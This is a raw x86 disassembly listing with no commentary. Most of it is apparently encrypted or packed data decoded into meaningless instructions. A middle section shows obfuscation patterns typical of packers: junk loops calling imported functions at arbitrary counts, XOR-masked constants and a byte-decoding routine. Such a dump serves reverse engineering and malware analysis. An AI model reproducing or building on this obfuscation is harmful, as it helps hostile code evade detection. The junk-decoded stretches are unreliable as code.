  41e24e:	mov    ah,0x22
  41e250:	pop    ecx
  41e251:	cli    
  41e252:	sbb    esp,edx
  41e254:	jp     0x41e2ad
  41e256:	mov    eax,DWORD PTR [edx-0x822a7b0]
  41e25c:	jne    0x41e2bd
  41e25e:	jp     0x41e2c4
  41e260:	ds cli 
  41e262:	jb     0x41e1f9
  41e264:	cmp    DWORD PTR [eax-0x7],edi
  41e267:	into   
  41e268:	stc    
  41e269:	mov    DWORD PTR [esp+ebx*8+0x27],0xbcc70b9d
  41e271:	pop    edi
  41e272:	jecxz  0x41e1f8
  41e274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e275:	fisttp WORD PTR [ecx-0x49]
  41e278:	mov    eax,ds:0x812cf369
  41e27d:	cdq    
  41e27e:	fdivr  st,st(2)
  41e280:	das    
  41e281:	fst    DWORD PTR [edx-0x73]
  41e284:	mov    ds:0x5a3f942,eax
  41e289:	mov    dh,0x67
  41e28b:	arpl   WORD PTR [ebp-0x1b5ddcda],ax
  41e291:	mov    dl,0x25
  41e293:	mov    edx,0xfe6c873f
  41e298:	loope  0x41e30c
  41e29a:	cmp    ebp,DWORD PTR [edx+esi*2-0x660692]
  41e2a1:	lock movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41e2a4:	lods   al,BYTE PTR ds:[esi]
  41e2a5:	out    dx,al
  41e2a6:	cmp    al,0x8c
  41e2a8:	dec    esp
  41e2a9:	(bad)  
  41e2aa:	lock ins BYTE PTR es:[edi],dx
  41e2ac:	sahf   
  41e2ad:	xor    al,0x37
  41e2af:	mov    ebp,0x260e6a51
  41e2b4:	ror    BYTE PTR [edi+0x5a698da1],cl
  41e2ba:	out    0x51,eax
  41e2bc:	bound  esp,QWORD PTR [eax]
  41e2be:	and    al,0x36
  41e2c0:	or     esi,eax
  41e2c2:	mov    edi,0x178e7304
  41e2c7:	out    dx,al
  41e2c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2c9:	push   esp
  41e2ca:	cdq    
  41e2cb:	jp     0x41e33e
  41e2cd:	ret    0x7941
  41e2d0:	and    dh,ah
  41e2d2:	sub    dh,BYTE PTR [edx]
  41e2d4:	mov    ebx,0x923686e6
  41e2d9:	sbb    ebx,DWORD PTR [ebp+0x7a]
  41e2dc:	jno    0x41e28a
  41e2de:	adc    DWORD PTR [esi+0x4f],esi
  41e2e1:	lahf   
  41e2e2:	sbb    eax,0x46e4bf99
  41e2e7:	lods   eax,DWORD PTR ds:[esi]
  41e2e8:	mov    eax,0x969bf8d6
  41e2ed:	dec    edx
  41e2ee:	test   eax,0xea5da62b
  41e2f3:	cmc    
  41e2f4:	hlt    
  41e2f5:	in     eax,0xf9
  41e2f7:	imul   ebp,DWORD PTR [ecx+ecx*8-0x60],0xffffffdd
  41e2fc:	(bad)  
  41e2fd:	mov    es,eax
  41e2ff:	xlat   BYTE PTR ds:[ebx]
  41e300:	mov    eax,ds:0x2e1f15b6
  41e305:	mov    cl,0xe9
  41e307:	stc    
  41e308:	scas   eax,DWORD PTR es:[edi]
  41e309:	jp     0x41e315
  41e30b:	aaa    
  41e30c:	adc    dh,cl
  41e30e:	or     BYTE PTR [esp+0x6d],dl
  41e312:	arpl   WORD PTR [ebp-0x14],bp
  41e315:	popa   
  41e316:	cmp    eax,0x454d7340
  41e31b:	data16 cld 
  41e31d:	in     al,0x35
  41e31f:	stos   DWORD PTR es:[edi],eax
  41e320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e321:	gs je  0x41e380
  41e324:	int    0xc1
  41e326:	popa   
  41e327:	leave  
  41e328:	sub    eax,0xc06a7ed2
  41e32d:	ss jmp 0xd8cf6fc1
  41e333:	mov    cl,0xa7
  41e335:	outs   dx,DWORD PTR ds:[esi]
  41e336:	(bad)  
  41e337:	pop    ds
  41e338:	js     0x41e38c
  41e33a:	xor    DWORD PTR [ebx+0x67],0x2c
  41e33e:	xchg   esp,eax
  41e33f:	and    DWORD PTR [edx],esp
  41e341:	das    
  41e342:	retf   
  41e343:	and    esp,DWORD PTR [edx+0x71]
  41e346:	add    BYTE PTR [ecx-0x267615fa],ah
  41e34c:	inc    ebp
  41e34d:	mov    dh,0xb3
  41e34f:	mov    ebp,DWORD PTR [ecx-0x56ab52a7]
  41e355:	neg    BYTE PTR [eax+0x586df850]
  41e35b:	mov    esp,0x6b43df17
  41e360:	cli    
  41e361:	add    ch,BYTE PTR [edi-0xee07b0d]
  41e367:	in     eax,0x29
  41e369:	loopne 0x41e356
  41e36b:	adc    cl,ch
  41e36d:	ds dec ebx
  41e36f:	mov    eax,0x4f7faf07
  41e374:	dec    edx
  41e375:	mov    edx,0x3b05f2ee
  41e37a:	mov    ecx,0x7f241d4a
  41e37f:	loop   0x41e3df
  41e381:	mov    ds:0x75e4d648,eax
  41e386:	popf   
  41e387:	outs   dx,BYTE PTR ds:[esi]
  41e388:	ins    DWORD PTR es:[edi],dx
  41e389:	push   es
  41e38a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e38b:	adc    eax,0x762e9c9f
  41e390:	out    dx,eax
  41e391:	lock and dl,BYTE PTR [esi]
  41e394:	inc    edx
  41e395:	fdivp  st(5),st
  41e397:	aaa    
  41e398:	cmp    eax,0x2cb5e26f
  41e39d:	mov    ds:0x718bc639,al
  41e3a2:	in     eax,dx
  41e3a3:	inc    edx
  41e3a4:	mov    ?,WORD PTR [eax-0x7c]
  41e3a7:	xlat   BYTE PTR ds:[ebx]
  41e3a8:	cli    
  41e3a9:	leave  
  41e3aa:	lds    eax,FWORD PTR [edi-0x30]
  41e3ad:	xor    al,0xc2
  41e3af:	pop    esp
  41e3b0:	inc    ebx
  41e3b1:	fmul   DWORD PTR ds:0x199c6eb1
  41e3b7:	add    DWORD PTR [eax+0x19781fd0],ebp
  41e3bd:	inc    esp
  41e3be:	pop    es
  41e3bf:	es fwait
  41e3c1:	xor    DWORD PTR [esi],eax
  41e3c3:	adc    al,0x15
  41e3c5:	inc    ecx
  41e3c6:	mov    al,ds:0x5b27295d
  41e3cb:	mov    al,0xbd
  41e3cd:	nop
  41e3ce:	fcomp  QWORD PTR [ebx]
  41e3d0:	lock test BYTE PTR gs:[ebx],0xba
  41e3d5:	mov    ds,ebp
  41e3d7:	sahf   
  41e3d8:	(bad)  
  41e3d9:	not    DWORD PTR [esp+eiz*4]
  41e3dc:	or     BYTE PTR [edi],0xcc
  41e3df:	push   edx
  41e3e0:	jno    0x41e3b8
  41e3e2:	jb     0x41e439
  41e3e4:	inc    DWORD PTR [esi-0x21]
  41e3e7:	fsubp  st(3),st
  41e3e9:	lahf   
  41e3ea:	sbb    bh,BYTE PTR [edi]
  41e3ec:	fnstcw WORD PTR [edi]
  41e3ee:	and    DWORD PTR [ebx],esi
  41e3f0:	dec    edi
  41e3f1:	pop    esi
  41e3f2:	sub    ebp,DWORD PTR [esp+ebx*8+0x4f]
  41e3f6:	fcomp  DWORD PTR [edx+0x39]
  41e3f9:	cmp    ebx,DWORD PTR [edi]
  41e3fb:	outs   dx,BYTE PTR ds:[esi]
  41e3fc:	mov    al,ds:0x67effb8a
  41e401:	mov    edi,0xe0458912
  41e406:	mov    DWORD PTR ds:0x429028,0x1e
  41e410:	cmp    DWORD PTR ds:0x429028,0x0
  41e417:	je     0x41e45f
  41e41d:	cmp    DWORD PTR ds:0x429028,0x2e
  41e424:	jne    0x41e43f
  41e42a:	push   0x88e3
  41e42f:	push   0x5900
  41e434:	push   0x6949
  41e439:	call   DWORD PTR ds:0x425044
  41e43f:	mov    eax,ds:0x429028
  41e444:	dec    eax
  41e445:	mov    ds:0x429028,eax
  41e44a:	jmp    0x41e410
  41e44f:	mov    eax,ds:0x4245cf
  41e454:	mov    ecx,DWORD PTR ds:0x423e6c
  41e45a:	sub    ecx,eax
  41e45c:	or     eax,DWORD PTR [eax+ecx*1]
  41e45f:	mov    eax,ds:0x4240a8
  41e464:	mov    eax,DWORD PTR [eax]
  41e466:	mov    DWORD PTR [ebp-0x28],eax
  41e469:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  41e470:	mov    eax,DWORD PTR [ebp-0x38]
  41e473:	mov    DWORD PTR ds:0x42b004,0x13
  41e47d:	cmp    DWORD PTR ds:0x42b004,0x0
  41e484:	je     0x41e4fb
  41e48a:	cmp    DWORD PTR ds:0x42b004,0x19
  41e491:	jne    0x41e4ad
  41e497:	push   0x8602
  41e49c:	push   DWORD PTR [ebp-0x28]
  41e49f:	push   DWORD PTR [ebp-0x18]
  41e4a2:	push   0x5ed1
  41e4a7:	call   DWORD PTR ds:0x425048
  41e4ad:	mov    ecx,DWORD PTR ds:0x42b004
  41e4b3:	dec    ecx
  41e4b4:	mov    DWORD PTR ds:0x42b004,ecx
  41e4ba:	jmp    0x41e47d
  41e4bf:	and    DWORD PTR ds:0x42d010,0x0
  41e4c9:	mov    ecx,DWORD PTR ds:0x42d010
  41e4cf:	inc    ecx
  41e4d0:	mov    DWORD PTR ds:0x42d010,ecx
  41e4d6:	cmp    DWORD PTR ds:0x42d010,0x1d
  41e4dd:	jne    0x41e4ee
  41e4e3:	push   0x7e2c
  41e4e8:	call   DWORD PTR ds:0x42504c
  41e4ee:	cmp    DWORD PTR ds:0x42d010,0x1c
  41e4f5:	jb     0x41e4c9
  41e4fb:	xor    eax,esi
  41e4fd:	and    DWORD PTR ds:0x429008,0x0
  41e507:	jmp    0x41e519
  41e50c:	mov    ecx,DWORD PTR ds:0x429008
  41e512:	inc    ecx
  41e513:	mov    DWORD PTR ds:0x429008,ecx
  41e519:	cmp    DWORD PTR ds:0x429008,0x14
  41e520:	jae    0x41e568
  41e526:	cmp    DWORD PTR ds:0x429008,0xb
  41e52d:	jne    0x41e543
  41e533:	push   0x3d49
  41e538:	push   0x4243af
  41e53d:	call   DWORD PTR ds:0x425010
  41e543:	cmp    DWORD PTR ds:0x429008,0xa
  41e54a:	jne    0x41e55d
  41e550:	mov    ecx,DWORD PTR ds:0x429008
  41e556:	inc    ecx
  41e557:	mov    DWORD PTR ds:0x429008,ecx
  41e55d:	jmp    0x41e50c
  41e562:	and    ecx,0x72e7
  41e568:	add    eax,edi
  41e56a:	xor    DWORD PTR ds:0x42c010,0x649e
  41e574:	mov    DWORD PTR [ebp-0x30],eax
  41e577:	mov    ecx,DWORD PTR ds:0x429028
  41e57d:	xor    DWORD PTR ds:0x42b018,ecx
  41e583:	mov    eax,ds:0x424020
  41e588:	sbb    ecx,0x5dc9
  41e58e:	mov    DWORD PTR [ebp-0x30],eax
  41e591:	sub    eax,eax
  41e593:	mov    eax,DWORD PTR [ebp-0x20]
  41e596:	mov    DWORD PTR [ebp-0x14],eax
  41e599:	mov    eax,DWORD PTR [ebp-0x14]
  41e59c:	push   0x4
  41e59e:	not    ecx
  41e5a0:	pop    ecx
  41e5a1:	adc    DWORD PTR ds:0x42a004,0x37d1
  41e5ab:	sub    ecx,eax
  41e5ad:	add    ecx,DWORD PTR [ebp-0x28]
  41e5b0:	mov    eax,ds:0x429024
  41e5b5:	or     DWORD PTR ds:0x42a008,eax
  41e5bb:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41e5c2:	mov    DWORD PTR ds:0x42a008,0x13
  41e5cc:	cmp    DWORD PTR ds:0x42a008,0x0
  41e5d3:	je     0x41e627
  41e5d9:	cmp    DWORD PTR ds:0x42a008,0x9
  41e5e0:	jne    0x41e5f6
  41e5e6:	push   0x665a
  41e5eb:	push   0x4c85
  41e5f0:	call   DWORD PTR ds:0x425018
  41e5f6:	cmp    DWORD PTR ds:0x42a008,0xa
  41e5fd:	jne    0x41e60e
  41e603:	mov    eax,ds:0x42a008
  41e608:	dec    eax
  41e609:	mov    ds:0x42a008,eax
  41e60e:	xor    eax,eax
  41e610:	xor    eax,DWORD PTR ds:0x42a008
  41e616:	dec    eax
  41e617:	mov    ds:0x42a008,eax
  41e61c:	jmp    0x41e5cc
  41e621:	and    DWORD PTR ds:0x42c018,edi
  41e627:	mov    DWORD PTR [ebp-0x24],ecx
  41e62a:	and    DWORD PTR ds:0x42b000,0x4083
  41e634:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  41e63e:	mov    eax,DWORD PTR [ebp-0x14]
  41e641:	sub    DWORD PTR ds:0x429028,0x42c00c
  41e64b:	mov    DWORD PTR [ebp-0x94],eax
  41e651:	mov    DWORD PTR ds:0x429018,0x60a2
  41e65b:	mov    eax,DWORD PTR [ebp-0x24]
  41e65e:	mov    DWORD PTR [ebp-0x90],eax
  41e664:	sub    eax,0x1a7d
  41e669:	mov    eax,DWORD PTR [ebp-0x2c]
  41e66c:	add    DWORD PTR ds:0x429014,0x42b010
  41e676:	xor    eax,esi
  41e678:	add    eax,edi
  41e67a:	or     DWORD PTR ds:0x42a01c,0xdce
  41e684:	mov    DWORD PTR [ebp-0x8c],eax
  41e68a:	xor    DWORD PTR ds:0x42d004,0x42a000
  41e694:	lea    eax,[ebp-0x50]
  41e697:	sub    DWORD PTR ds:0x429020,0x429004
  41e6a1:	mov    DWORD PTR [ebp-0x88],eax
  41e6a7:	sub    DWORD PTR ds:0x429028,0x1657
  41e6b1:	mov    eax,DWORD PTR [ebp-0x98]
  41e6b7:	xor    eax,esi
  41e6b9:	sub    DWORD PTR ds:0x42c01c,0x42d010
  41e6c3:	add    eax,edi
  41e6c5:	mov    DWORD PTR [ebp-0x98],eax
  41e6cb:	and    DWORD PTR ds:0x42d004,0x42b004
  41e6d5:	lea    eax,[ebp-0x98]
  41e6db:	sbb    DWORD PTR ds:0x42d008,0x429018
  41e6e5:	push   eax
  41e6e6:	and    DWORD PTR ds:0x42c004,edi
  41e6ec:	mov    eax,DWORD PTR [ebp+0xc]
  41e6ef:	sub    DWORD PTR ds:0x42b014,0x42a01c
  41e6f9:	xor    eax,esi
  41e6fb:	add    eax,edi
  41e6fd:	sbb    DWORD PTR ds:0x429024,0x42c01c
  41e707:	push   eax
  41e708:	and    eax,DWORD PTR ds:0x42c018
  41e70e:	mov    eax,ds:0x424040
  41e713:	adc    DWORD PTR ds:0x429004,0x7be0
  41e71d:	push   0x423f96
  41e722:	and    DWORD PTR ds:0x429000,0x42b018
  41e72c:	push   DWORD PTR [eax]
  41e72e:	xor    DWORD PTR ds:0x42c014,0x72b4
  41e738:	call   0x40867e
  41e73d:	inc    eax
  41e73e:	mov    eax,DWORD PTR [ebp-0x14]
  41e741:	add    ecx,DWORD PTR ds:0x42b00c
  41e747:	mov    ecx,DWORD PTR [ebp-0x24]
  41e74a:	mov    DWORD PTR [ebp-0x4c],ecx
  41e74d:	mov    ecx,DWORD PTR [ebp+0x8]
  41e750:	xor    DWORD PTR ds:0x429020,0x42a008
  41e75a:	xor    ecx,esi
  41e75c:	mov    DWORD PTR [ebp-0x38],eax
  41e75f:	xor    DWORD PTR ds:0x42c014,0x42a014
  41e769:	add    ecx,edi
  41e76b:	jmp    0x423ba0
  41e770:	adc    ebx,DWORD PTR ds:0x429018
  41e776:	lea    edx,[ecx+eax*1]
  41e779:	mov    DWORD PTR ds:0x42d000,0x1d
  41e783:	cmp    DWORD PTR ds:0x42d000,0x0
  41e78a:	je     0x41e7ca
  41e790:	cmp    DWORD PTR ds:0x42d000,0x24
  41e797:	jne    0x41e7b0
  41e79d:	push   0x42a008
  41e7a2:	push   DWORD PTR [ebp-0x14]
  41e7a5:	push   0x4243cb
  41e7aa:	call   DWORD PTR ds:0x42501c
  41e7b0:	xor    ebx,ebx
  41e7b2:	add    ebx,DWORD PTR ds:0x42d000
  41e7b8:	dec    ebx
  41e7b9:	mov    DWORD PTR ds:0x42d000,ebx
  41e7bf:	jmp    0x41e783
  41e7c4:	and    DWORD PTR ds:0x42c010,ecx
  41e7ca:	mov    DWORD PTR [ebp-0x28],edx
  41e7cd:	sub    edx,ebx
  41e7cf:	mov    edx,DWORD PTR [ebp-0x4c]
  41e7d2:	and    DWORD PTR ds:0x42d00c,0x0
  41e7dc:	jmp    0x41e7ee
  41e7e1:	mov    ebx,DWORD PTR ds:0x42d00c
  41e7e7:	inc    ebx
  41e7e8:	mov    DWORD PTR ds:0x42d00c,ebx
  41e7ee:	cmp    DWORD PTR ds:0x42d00c,0x19
  41e7f5:	jae    0x41e843
  41e7fb:	cmp    DWORD PTR ds:0x42d00c,0xe
  41e802:	jne    0x41e818
  41e808:	push   0x42901c
  41e80d:	push   0x4df2
  41e812:	call   DWORD PTR ds:0x425020
  41e818:	cmp    DWORD PTR ds:0x42d00c,0xd
  41e81f:	jne    0x41e834
  41e825:	xor    ebx,ebx
  41e827:	xor    ebx,DWORD PTR ds:0x42d00c
  41e82d:	inc    ebx
  41e82e:	mov    DWORD PTR ds:0x42d00c,ebx
  41e834:	jmp    0x41e7e1
  41e839:	sbb    DWORD PTR ds:0x42d00c,0x42a014
  41e843:	sub    edx,ecx
  41e845:	sbb    DWORD PTR ds:0x429014,ebx
  41e84b:	mov    DWORD PTR [ebp-0x20],edx
  41e84e:	and    DWORD PTR ds:0x42d01c,0x0
  41e858:	mov    edx,DWORD PTR ds:0x42d01c
  41e85e:	inc    edx
  41e85f:	mov    DWORD PTR ds:0x42d01c,edx
  41e865:	cmp    DWORD PTR ds:0x42d01c,0x8
  41e86c:	jne    0x41e87b
  41e872:	push   DWORD PTR [ebp-0x10]
  41e875:	call   DWORD PTR ds:0x425028
  41e87b:	cmp    DWORD PTR ds:0x42d01c,0x7
  41e882:	jne    0x41e897
  41e888:	xor    edx,edx
  41e88a:	or     edx,DWORD PTR ds:0x42d01c
  41e890:	inc    edx
  41e891:	mov    DWORD PTR ds:0x42d01c,edx
  41e897:	cmp    DWORD PTR ds:0x42d01c,0x11
  41e89e:	jb     0x41e858
  41e8a4:	mov    edx,DWORD PTR [ebp-0x20]
  41e8a7:	mov    DWORD PTR [ebp-0x14],edx
  41e8aa:	mov    edx,DWORD PTR [ebp-0x28]
  41e8ad:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  41e8b4:	mov    DWORD PTR [ebp-0x44],edx
  41e8b7:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41e8be:	mov    edx,DWORD PTR [ebp-0x34]
  41e8c1:	xor    edx,esi
  41e8c3:	add    edx,edi
  41e8c5:	mov    DWORD PTR [ebp-0x10],edx
  41e8c8:	mov    edx,DWORD PTR [ebp-0x34]
  41e8cb:	xor    edx,esi
  41e8cd:	add    edx,edi
  41e8cf:	mov    DWORD PTR [ebp-0x8],edx
  41e8d2:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41e8d9:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41e8e0:	mov    edx,DWORD PTR [ebp-0x34]
  41e8e3:	mov    ebx,DWORD PTR [ebp-0x14]
  41e8e6:	xor    edx,esi
  41e8e8:	add    edx,edi
  41e8ea:	cmp    ebx,edx
  41e8ec:	je     0x423b94
  41e8f2:	mov    eax,DWORD PTR [ebp-0x18]
  41e8f5:	xor    eax,esi
  41e8f7:	mov    edx,0xffcd8d25
  41e8fc:	sub    edx,eax
  41e8fe:	add    edx,DWORD PTR [ebp-0x14]
  41e901:	mov    eax,DWORD PTR [ebp-0x18]
  41e904:	mov    ebx,DWORD PTR [ebp-0x10]
  41e907:	xor    eax,esi
  41e909:	add    eax,edi
  41e90b:	imul   eax,ebx
  41e90e:	cmp    eax,edx
  41e910:	ja     0x423b91
  41e916:	mov    edx,DWORD PTR [ebp-0x10]
  41e919:	mov    eax,DWORD PTR [ebp-0x14]
  41e91c:	mov    ebx,DWORD PTR [ebp-0x28]
  41e91f:	sub    eax,edx
  41e921:	xor    ebx,esi
  41e923:	xor    edx,edx
  41e925:	add    ebx,edi
  41e927:	div    ebx
  41e929:	mov    DWORD PTR [ebp-0x8],eax
  41e92c:	mov    eax,DWORD PTR [ebp-0x2c]
  41e92f:	mov    edx,DWORD PTR [ebp-0x8]
  41e932:	xor    eax,esi
  41e934:	add    eax,edi
  41e936:	cmp    edx,eax
  41e938:	jbe    0x41e948
  41e93e:	mov    eax,DWORD PTR [ebp-0x2c]
  41e941:	xor    eax,esi
  41e943:	add    eax,edi
  41e945:	mov    DWORD PTR [ebp-0x8],eax
  41e948:	mov    eax,DWORD PTR [ebp-0x28]
  41e94b:	mov    edx,DWORD PTR [ebp-0x8]
  41e94e:	xor    eax,esi
  41e950:	add    eax,edi
  41e952:	imul   eax,edx
  41e955:	mov    DWORD PTR [ebp-0x8],eax
  41e958:	mov    eax,DWORD PTR [ebp-0x34]
  41e95b:	mov    edx,DWORD PTR [ebp-0x8]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    edx,eax
  41e964:	je     0x423b7a
  41e96a:	mov    eax,DWORD PTR [ebp-0x8]
  41e96d:	mov    DWORD PTR [ebp-0x24],eax
  41e970:	mov    eax,DWORD PTR [ebp-0x10]
  41e973:	add    eax,DWORD PTR [ebp-0x44]
  41e976:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41e97d:	mov    DWORD PTR [ebp-0x8],eax
  41e980:	mov    eax,0xf89c85b5
  41e985:	mov    DWORD PTR [ebp-0x3c],eax
  41e988:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  41e98f:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  41e996:	mov    DWORD PTR [ebp-0x1c],eax
  41e999:	mov    eax,DWORD PTR [ebp-0x20]
  41e99c:	xor    eax,esi
  41e99e:	add    eax,edi
  41e9a0:	jmp    0x423b36
  41e9a5:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41e9ac:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9af:	mov    edx,DWORD PTR [ebp-0xc]
  41e9b2:	xor    eax,esi
  41e9b4:	add    eax,edi
  41e9b6:	imul   eax,edx
  41e9b9:	mov    edx,DWORD PTR [ebp-0x8]
  41e9bc:	mov    al,BYTE PTR [eax+edx*1]
  41e9bf:	mov    BYTE PTR [ebp-0x1],al
  41e9c2:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9c5:	mov    edx,DWORD PTR [ebp-0xc]
  41e9c8:	xor    eax,esi
  41e9ca:	add    eax,edi
  41e9cc:	imul   eax,edx
  41e9cf:	mov    edx,DWORD PTR [ebp-0x40]
  41e9d2:	xor    edx,esi
  41e9d4:	add    eax,edx
  41e9d6:	mov    edx,DWORD PTR [ebp-0x8]
  41e9d9:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  41e9e1:	jmp    0x420d2f
  41e9e6:	iret   
  41e9e7:	and    edi,DWORD PTR [esi+0x59]
  41e9ea:	(bad)  
  41e9eb:	daa    
  41e9ec:	mov    ds:0x1c7877a3,eax
  41e9f1:	jle    0x41e9a2
  41e9f3:	pop    ecx
  41e9f4:	sbb    bl,BYTE PTR [eax]
  41e9f6:	adc    ebx,edx
  41e9f8:	popa   
  41e9f9:	bound  edx,QWORD PTR [ecx+0x5f]
  41e9fc:	bound  esp,QWORD PTR [edx+0x5a]
  41e9ff:	in     eax,0x9e
  41ea01:	mov    ah,0x2
  41ea03:	inc    ebp
  41ea04:	and    DWORD PTR [ebp+0x64ca5043],edi
  41ea0a:	mov    al,BYTE PTR [ecx]
  41ea0c:	cmp    bh,0x86
  41ea0f:	inc    ebx
  41ea10:	sbb    DWORD PTR [esi+0x5e],ebp
  41ea13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea14:	xor    edi,DWORD PTR [esi-0xedbf5d8]
  41ea1a:	es daa 
  41ea1c:	push   esi
  41ea1d:	mov    WORD PTR [ebp-0x74],?
  41ea20:	mov    gs,WORD PTR [edx-0x76]
  41ea23:	mov    bh,0xd
  41ea25:	lsl    ebp,WORD PTR [edx+0x46c6c9a8]
  41ea2c:	push   es
  41ea2d:	push   ebx
  41ea2e:	retf   
  41ea2f:	outs   dx,BYTE PTR ds:[esi]
  41ea30:	sbb    dh,dh
  41ea32:	repz fld QWORD PTR [ecx+0x36b6e50d]
  41ea39:	and    ebx,DWORD PTR [ecx+0x26]
  41ea3c:	cdq    
  41ea3d:	push   edi
  41ea3e:	fs aad 0xa2
  41ea41:	les    esi,FWORD PTR [edi-0x6c]
  41ea44:	push   0x7c
  41ea46:	scas   eax,DWORD PTR es:[edi]
  41ea47:	and    DWORD PTR [eax+0x15cfa0ec],0xb444a62f
  41ea51:	out    dx,al
  41ea52:	dec    ebx
  41ea53:	jmp    0x519a:0x24d52248
  41ea5a:	and    dh,BYTE PTR [ebx-0x1c0b1527]
  41ea60:	jmp    0x5022484d
  41ea65:	stos   BYTE PTR es:[edi],al
  41ea66:	mov    ch,0x67
  41ea68:	int    0x13
  41ea6a:	or     BYTE PTR [edx-0x37],al
  41ea6d:	adc    BYTE PTR [eax-0x4f],ah
  41ea70:	xor    al,0x82
  41ea72:	call   0xa8d1:0x1403cbc6
  41ea79:	push   ecx
  41ea7a:	push   ds
  41ea7b:	sub    edi,esi
  41ea7d:	sbb    ah,bh
  41ea7f:	xchg   edx,eax
  41ea80:	add    al,0x32
  41ea82:	(bad)  
  41ea84:	push   esi
  41ea85:	aaa    
  41ea86:	pushf  
  41ea87:	aam    0xc1
  41ea89:	dec    ecx
  41ea8a:	adc    eax,0xd7f01b5a
  41ea8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea90:	test   DWORD PTR [esi-0x56],edx
  41ea93:	test   DWORD PTR [ebx+0x76dd03bb],0x1b5f48b8
  41ea9d:	adc    esp,DWORD PTR [ecx+0x7a]
  41eaa0:	ret    
  41eaa1:	xchg   BYTE PTR [ebx],al
  41eaa3:	dec    edi
  41eaa4:	sar    BYTE PTR [edx+0x7a],0x88
  41eaa8:	mov    ebx,0xa31dd1f5
  41eaae:	jmp    0x272de117
  41eab3:	mov    ah,0x32
  41eab5:	cmp    DWORD PTR [eax],edx
  41eab7:	pop    eax
  41eab8:	inc    ebx
  41eab9:	pushf  
  41eaba:	out    0xa6,eax
  41eabc:	mov    ds:0x655a2471,eax
  41eac1:	push   esp
  41eac2:	jg     0x41eaf7
  41eac4:	in     eax,0xe2
  41eac6:	out    0xad,al
  41eac8:	adc    DWORD PTR [edi],esi
  41eaca:	and    al,0x47
  41eacc:	retf   
  41eacd:	mov    dh,0x41
  41eacf:	mov    ch,0xda
  41ead1:	repz and BYTE PTR [ecx+0x7684f6a3],al
  41ead8:	mov    esi,0xd635116a
  41eadd:	sbb    ebx,DWORD PTR [ecx+ecx*8+0x33]
  41eae1:	es push ds
  41eae3:	jle    0x41eab2
  41eae5:	(bad)  
  41eae6:	xchg   edx,eax
  41eae7:	ds add al,0x1f
  41eaea:	adc    BYTE PTR [ecx-0x32],bl
  41eaed:	inc    esi
  41eaee:	inc    DWORD PTR [edi]
  41eaf0:	mov    bh,0xfe
  41eaf2:	lahf   
  41eaf3:	jp     0x41ea85
  41eaf5:	jmp    0x4f44:0x1860b7cc
  41eafc:	(bad)  
  41eafd:	push   eax
  41eafe:	cmc    
  41eaff:	rol    al,cl
  41eb01:	xor    DWORD PTR [edi+ecx*1-0x45],0x78
  41eb06:	mov    esp,0x802397af
  41eb0b:	stos   DWORD PTR es:[edi],eax
  41eb0c:	leave  
  41eb0d:	push   ss
  41eb0e:	xchg   edi,eax
  41eb0f:	jnp    0x41eb47
  41eb11:	fld    st(0)
  41eb13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb14:	stos   BYTE PTR es:[edi],al
  41eb15:	mov    DWORD PTR [eax],0xbfb08267
  41eb1b:	ja     0x41eb52
  41eb1d:	push   edi
  41eb1e:	sbb    BYTE PTR [esi+0x393d3b3a],ch
  41eb24:	inc    esp
  41eb25:	jl     0x41eac8
  41eb27:	outs   dx,BYTE PTR ds:[esi]
  41eb28:	(bad)  
  41eb29:	aas    
  41eb2a:	push   edi
  41eb2b:	mov    bl,0xbe
  41eb2d:	popa   
  41eb2e:	xchg   ebx,eax
  41eb2f:	xchg   edx,eax
  41eb30:	out    dx,eax
  41eb31:	in     eax,0x11
  41eb33:	push   ebp
  41eb35:	ins    BYTE PTR es:[edi],dx
  41eb36:	push   ss
  41eb37:	fidiv  WORD PTR [esp+edi*4-0x76]
  41eb3b:	push   ebp
  41eb3c:	data16 jle 0x41eb62
  41eb3f:	test   dl,ch
  41eb41:	xor    ebp,DWORD PTR [esi]
  41eb43:	jo     0x41eae3
  41eb45:	cmp    DWORD PTR [eax],eax
  41eb47:	je     0x41eb13
  41eb49:	mov    ah,0xad
  41eb4b:	ret    
  41eb4c:	imul   ebx,DWORD PTR [ecx-0x3b670318],0xffffff93
  41eb53:	jno    0x41eb00
  41eb55:	add    al,0xab
  41eb57:	jl     0x41ebc8
  41eb59:	mov    edi,0xabbd5635
  41eb5e:	in     al,dx
  41eb5f:	adc    ah,BYTE PTR [esp+edx*4]
  41eb62:	push   es
  41eb63:	icebp  
  41eb64:	test   eax,0x6a75b58f
  41eb69:	mov    esi,0x1945140
  41eb6e:	mov    dl,0xaa
  41eb70:	pop    ss
  41eb71:	fidiv  WORD PTR [edx]
  41eb73:	mov    dh,0xd7
  41eb75:	push   es
  41eb76:	cmp    dh,BYTE PTR ds:0x1948c6d5
  41eb7c:	cld    
  41eb7d:	cs jnp 0x41eb8d
  41eb80:	in     al,dx
  41eb81:	jge    0x41eb03
  41eb83:	sub    al,0xba
  41eb85:	add    BYTE PTR [edi-0x31],ah
  41eb88:	into   
  41eb89:	cs inc ebp
  41eb8b:	fisubr DWORD PTR [eax+0x42]
  41eb8e:	ficom  WORD PTR [ebx-0x68]
  41eb91:	cmc    
  41eb92:	fwait
  41eb93:	and    BYTE PTR [ecx+0x48],dl
  41eb96:	push   ebx
  41eb97:	add    eax,0xb946509f
